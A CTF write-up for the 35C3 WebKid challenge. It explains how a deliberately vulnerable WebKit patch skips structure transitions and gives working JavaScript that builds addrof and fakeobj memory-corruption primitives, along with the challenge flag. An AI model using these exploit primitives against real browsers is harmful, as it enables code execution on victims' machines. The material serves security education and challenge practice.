WebKid
======

*This is a Writeup for the WebKid challenge of 35C3CTF. Challenge files can be found [here](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/WebKid-7a2c78814764c77b3b8e1d8391b9cabcb2a58810.zip). You can submit your exploit [here](https://vms.35c3ctf.ccc.ac/).*

In this challenge, we've got a WebKit patch and a prebuilt WebKit version. First step of course was to look into the patch, so let's do that now.

I started by looking at the JSObject::deleteProperty function, which is called when a property on a JavaScript object is deleted (with some exceptions, e.g. it's not called when you remove a numeric property). After applying the patch, it looks like this:

```c
bool JSObject::deleteProperty(JSCell* cell, ExecState* exec, PropertyName propertyName)
 {
     Structure* structure = thisObject->structure(vm);
 
     PropertyOffset offset = structure->get(vm, propertyName, attributes);
     bool propertyIsPresent = isValidOffset(offset);
     if (propertyIsPresent) {
         if (attributes & PropertyAttribute::DontDelete && vm.deletePropertyMode() != VM::DeletePropertyMode::IgnoreConfigurable)
             return false;
 
         if (structure->isUncacheableDictionary()) {
             offset = structure->removePropertyWithoutTransition(vm, propertyName, [] (const ConcurrentJSLocker&, PropertyOffset) { });t));
         } else {
             // This is new. The name also suggests something bad is happening here...
             if (!tryDeletePropertyQuickly(vm, thisObject, structure, propertyName, attributes, offset)) {
                 // If deleting the property quickly didn't work, do it the normal way.
                 thisObject->setStructure(vm, Structure::removePropertyTransition(vm, structure, propertyName, offset));
             }
         }
 
         if (offset != invalidOffset && (!isOutOfLineOffset(offset) || thisObject->butterfly()))
             thisObject->locationForOffset(offset)->clear();
     }
     // ...
```

Basically, a new tryDeletePropertyQuickly function is added and it is used whenever possible. In case deleting the property quickly doesn't work, it is deleted using the old way.

So let's now look into this tryDeletePropertyQuickly function:

```c
static bool tryDeletePropertyQuickly(VM& vm, JSObject* thisObject, Structure* structure, PropertyName propertyName, unsigned attributes, PropertyOffset offset)
{
    // This assert will always be true as long as we're not passing an "invalid" offset
    ASSERT(isInlineOffset(offset) || isOutOfLineOffset(offset));

    // Try to get the previous structure of this object
    Structure* previous = structure->previousID();
    if (!previous)
        return false; // If it has none, stop here

    unsigned unused;
    // Check if the property we're deleting is the last one we added
    // This must be the case if the old structure doesn't have this property
    bool isLastAddedProperty = !isValidOffset(previous->get(vm, propertyName, unused));
    if (!isLastAddedProperty)
        return false; // Not the last property? Stop here and remove it using the normal way.

    // Assert that adding the property to the last structure would result in getting the current structure
    RELEASE_ASSERT(Structure::addPropertyTransition(vm, previous, propertyName, attributes, offset) == structure);

    // Uninteresting. Basically, this just deletes this objects Butterfly if it's not an array and we're asked to delete the last out-of-line property. The Butterfly then becomes useless because no property is stored in it, so we can delete it.
    if (offset == firstOutOfLineOffset && !structure->hasIndexingHeader(thisObject)) {
        ASSERT(!previous->hasIndexingHeader(thisObject) && structure->outOfLineCapacity() > 0 && previous->outOfLineCapacity() == 0);
        thisObject->setButterfly(vm, nullptr);
    }

    // Directly set the structure of this object
    thisObject->setStructure(vm, previous);

    return true;
}
```

This function seems to look right. But, we're not doing a structure transition like we did using the normal way. We're directly setting the Structure of this object to the old structure. But why is this bad? Let's consider the following JS code:

```js
myArray = [13.37, 73.31];

function returnElem() {
    return myArray[0];
}

// Force JIT compilation of returnElem
for (var i = 0; i < 100000; i++)
    returnElem();

print(returnElem()); // Using JSC's print function
```

The interesting part is when the returnElem function is JIT compiled. Because the JIT compiler is smart, it will create a highly optimized version of returnElem, which doesn't contain any structure checks for myArray at all. Instead, the JIT compiler will place a Watchpoint on myArray's structure.

If this Watchpoint fires, the JITed version of the returnElem function will be immediately destroyed and the interpreter will be used on subsequent calls. The Watchpoint only fires if a structure transition occurs.

Now, if we could change myArray without triggering the Watchpoint, we could easily exploit this! Thankfully, we've got this new tryDeletePropertyQuickly function. If it succeeds, it will change the structure of the passed-in object, without triggering a structure transition, therefore not triggering any Watchpoints that might be present!

Consider the following code:

```c
// myArray is an unboxed array only containing doubles
myArray = [13.37, 73.31];
// Add the property
myArray.newProperty = 1337;

function returnElem() {
    return myArray[0];
}

// Force JIT compilation of returnElem
for (var i = 0; i < 100000; i++)
    returnElem();

// Now delete the newProperty property, which is the one we added last.
// This will not fire the watchpoint on myArray's current structure.
// Afterwards, we can modify myArray without triggering the watchpoint.
// The structure chain currently looks like this:
//  -------------------
// | Added newProperty |   <- We are currently here, the watchpoint is set on this.
//  -------------------
//           ^
//           |
//           |
//           |
//  --------------------
// | Original structure |
//  --------------------
delete myArray.newProperty;
// Now the structure chain looks like this:
//  -------------------
// | Added newProperty |   <- The watchpoint is set on this.
//  -------------------
//           ^
//           |
//           |
//           |
//  --------------------
// | Original structure |  <- We are here now.
//  --------------------
//
// Now we can freely modify myArray as we want to.
// To exploit, set element 0 to an object.
// returnElem will still think that element 0 is a double and return you the address of this object as double!
myArray[0] = {}; // myArray is now a boxed array containing an object and a double
print(returnElem()); // Using JSC's print function; Should print an address as double, use the Int64 library to parse
```

With this, we can now build our addrof and fakeobj primitives. Code:

```c
haxxArray = [13.37, 73.31];
haxxArray.newProperty = 1337;

function returnElem() {
    return haxxArray[0];
}

function setElem(obj) {
    haxxArray[0] = obj;
}

for (var i = 0; i < 100000; i++) {
    returnElem();
    setElem(13.37);
}

delete haxxArray.newProperty;
haxxArray[0] = {};

function addrof(obj) {
    haxxArray[0] = obj;
    return returnElem();
}

function fakeobj(address) {
    setElem(address);
    return haxxArray[0];
}

print(addrof({}));
print(fakeobj(addrof({})));
```

For full exploitation, just replace the addrof/fakeobj gadgets of an existing exploit, then change the payload. I used the code of my public WebKit exploit, which can be found [here](https://github.com/LinusHenze/WebKit-RegEx-Exploit). If you want to try this out, just replace pwn.js and make.py with the ones found [here](https://github.com/LinusHenze/35C3_Writeups/tree/master/WebKid) (copy make.py to the stage2 directory, don't forget to run it afterwards). When running this on the challenge VM (submit http://\<your ip\>/pwn.html), you should get the first flag, which is: 35C3\_alright\_now\_escape\_the\_sandbox\_please